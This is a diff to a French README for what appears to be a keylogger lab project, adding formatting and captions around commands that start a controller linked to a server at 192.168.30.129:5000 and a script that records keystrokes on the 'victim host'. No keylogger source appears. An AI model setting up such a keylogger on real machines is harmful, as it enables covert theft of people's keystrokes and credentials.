@@ -58,7 +58,9 @@ Le controleur nous permmet un affichage intéractif en ligne de commande pour co
 python3 controller.py --server http://192.168.30.129:5000
 
 ```
+Voici le controleur keylloger lancé ci-haut
 
+```
 ================================================================================
                          CONTRÔLEUR KEYLOGGER
 ================================================================================
@@ -71,6 +73,7 @@ python3 controller.py --server http://192.168.30.129:5000
 
 Choix: 
 
+```
 
 - Sur l'hôte victime
 
@@ -80,6 +83,9 @@ Ce script nous permet de capturer les frappes clavier de la victime distante, sa
 
 ```
 python3 v3_keylogger_simple.py
+```
+Le début d'écoute de keylloger sur la machine victime 
+
 ```
 python3 v3_keylloger.py 
 [*] ========================================
@@ -95,6 +101,7 @@ python3 v3_keylloger.py
 [*]   - Tapez 'quit' pour quitter
 [*] 
 [*] ========================================
+```
 
 
 D. Fonctionnement du système 
